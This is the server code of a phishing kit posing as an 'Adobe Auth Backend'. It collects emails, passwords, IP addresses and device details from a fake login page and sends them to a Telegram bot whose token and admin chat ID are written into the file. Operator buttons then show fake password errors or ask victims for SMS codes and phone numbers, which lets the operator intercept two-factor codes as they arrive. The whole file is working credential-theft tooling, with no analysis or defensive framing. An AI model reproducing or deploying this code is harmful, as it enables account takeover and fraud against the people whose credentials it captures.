const express = require('express');
const cors    = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const BOT_TOKEN   = process.env.BOT_TOKEN   || '8748301916:AAHC09wVDPVG-xLObOvD-k_pAFiu8TnkwAw';
const ADMIN_CHAT  = process.env.ADMIN_CHAT  || '8745609962';
const PORT        = process.env.PORT        || 3000;

// ─── APP SETUP ────────────────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.use(cors());

// Serve frontend from same origin (place index.html in ../frontend or ./public)
app.use(express.static(path.join(__dirname, '..', 'frontend')));
app.use(express.static(path.join(__dirname, 'public')));

// ─── IN-MEMORY SESSION STORE ──────────────────────────────────────────────────
// { [sessionId]: { email, password, name, ip, device, ua, type, status, messageId, createdAt } }
const sessions = {};

// Allowed statuses:
//   'pending'         – waiting for admin action
//   'approved'        – admin clicked ✅ Yes Prompt
//   'denied'          – admin clicked ❌ Password Error
//   'blocked'         – admin clicked 🚫 Block Visitor
//   'sms_required'    – admin clicked 📱 SMS Code I
//   'sms2_required'   – admin clicked 📱 SMS Code II
//   'number_required' – admin clicked 📞 Number Prompt

// ─── TELEGRAM BOT ─────────────────────────────────────────────────────────────
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));

// Helper: send a visit notification to admin with inline keyboard
async function sendVisitNotification(session) {
  const { sessionId, email, password, name, ip, device, ua, type } = session;

  const text =
`🔐 *NEW VISIT* 🔐
━━━━━━━━━━━━━━━━━━
📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
${name ? `👤 *Name:* \`${name}\`\n` : ''}🌐 *IP:* \`${ip}\`
📱 *Device:* ${device}
🕐 *Time:* ${new Date().toUTCString()}
🔄 *Type:* ${type === 'register' ? 'Registration' : 'Login'}
━━━━━━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Yes Prompt',      callback_data: `${sessionId}::approved`        },
        { text: '📱 SMS Code I',      callback_data: `${sessionId}::sms_required`    }
      ],
      [
        { text: '📟 SMS Code II',     callback_data: `${sessionId}::sms2_required`   },
        { text: '📞 Number Prompt',   callback_data: `${sessionId}::number_required` }
      ],
      [
        { text: '❌ Password Error',  callback_data: `${sessionId}::denied`          },
        { text: '🚫 Block Visitor',   callback_data: `${sessionId}::blocked`         }
      ]
    ]
  };

  try {
    const msg = await bot.sendMessage(ADMIN_CHAT, text, {
      parse_mode: 'Markdown',
      reply_markup: keyboard
    });
    return msg.message_id;
  } catch (err) {
    console.error('[TG Send Error]', err.message);
    return null;
  }
}

// Handle admin button presses
bot.on('callback_query', async (query) => {
  const [sessionId, action] = (query.data || '').split('::');
  const session = sessions[sessionId];

  if (!session) {
    await bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired or not found.' });
    return;
  }

  // Update session status
  session.status = action;

  // Build confirmation message
  const statusLabels = {
    approved:        '✅ Approved — access granted',
    denied:          '❌ Denied — password error shown',
    blocked:         '🚫 Blocked — visitor blocked',
    sms_required:    '📱 SMS Code I requested',
    sms2_required:   '📟 SMS Code II requested',
    number_required: '📞 Number prompt shown',
  };

  const label = statusLabels[action] || action;

  // Edit the original message to show the action taken
  try {
    await bot.editMessageText(
      `${query.message.text}\n\n👮 *Action taken:* ${label}`,
      {
        chat_id: ADMIN_CHAT,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [] }
      }
    );
  } catch(_) {}

  await bot.answerCallbackQuery(query.id, { text: label });

  console.log(`[Session ${sessionId}] Status → ${action}`);
});

// When visitor submits SMS code — notify admin
async function notifySMSCode(session, code, codeType) {
  const text =
`📟 *SMS CODE RECEIVED*
━━━━━━━━━━━━━
📧 *Email:* \`${session.email}\`
🔢 *Code:* \`${code}\`
📋 *Type:* ${codeType === 'sms2' ? 'SMS Code II' : 'SMS Code I'}
━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Accept Code',  callback_data: `${session.sessionId}::approved` },
      { text: '❌ Reject Code',  callback_data: `${session.sessionId}::denied`   },
      { text: '📱 Request II',  callback_data: `${session.sessionId}::sms2_required` }
    ]]
  };

  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
  session.status = 'pending'; // wait for admin decision again
}

// When visitor submits phone — notify admin
async function notifyPhone(session, phone) {
  const text =
`📞 *PHONE NUMBER RECEIVED*
━━━━━━━━━━━━━
📧 *Email:* \`${session.email}\`
📱 *Phone:* \`${phone}\`
━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve',     callback_data: `${session.sessionId}::approved`     },
      { text: '📱 SMS Code I', callback_data: `${session.sessionId}::sms_required` },
      { text: '❌ Deny',       callback_data: `${session.sessionId}::denied`        }
    ]]
  };

  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
  session.status = 'pending';
}

// ─── API ROUTES ───────────────────────────────────────────────────────────────

// POST /api/login — visitor submits credentials
app.post('/api/login', async (req, res) => {
  const { email, password, name, ip, device, ua, type } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const sessionId = uuidv4();
  const session = {
    sessionId,
    email,
    password,
    name: name || null,
    ip: ip || 'Unknown',
    device: device || 'Unknown',
    ua: ua || '',
    type: type || 'login',
    status: 'pending',
    createdAt: Date.now()
  };

  sessions[sessionId] = session;

  // Send Telegram notification
  const messageId = await sendVisitNotification(session);
  session.messageId = messageId;

  console.log(`[New Session] ${sessionId} | ${email} | ${ip}`);
  res.json({ sessionId, status: 'pending' });
});

// GET /api/session/:id/status — frontend polls this
app.get('/api/session/:id/status', (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ status: 'expired' });

  // Auto-expire after 10 minutes
  if (Date.now() - session.createdAt > 10 * 60 * 1000) {
    delete sessions[req.params.id];
    return res.json({ status: 'expired' });
  }

  res.json({ status: session.status });
});

// POST /api/session/:id/sms — visitor submits SMS code
app.post('/api/session/:id/sms', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Session not found' });

  const { code } = req.body;
  const codeType = session.status === 'sms2_required' ? 'sms2' : 'sms1';

  await notifySMSCode(session, code, codeType);

  res.json({ ok: true });
});

// POST /api/session/:id/phone — visitor submits phone number
app.post('/api/session/:id/phone', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Session not found' });

  const { phone } = req.body;
  await notifyPhone(session, phone);

  res.json({ ok: true });
});

// Fallback — serve frontend
app.get('*', (req, res) => {
  const frontendPath = path.join(__dirname, '..', 'frontend', 'index.html');
  res.sendFile(frontendPath, err => {
    if (err) res.status(404).send('Not found');
  });
});

// ─── START ────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`
  ╔═══════════════════════════════════════╗
  ║   Adobe Auth Backend — Running!       ║
  ║   http://localhost:${PORT}              ║
  ║   Telegram Bot: @Madtt7bot           ║
  ╚═══════════════════════════════════════╝
  `);
});
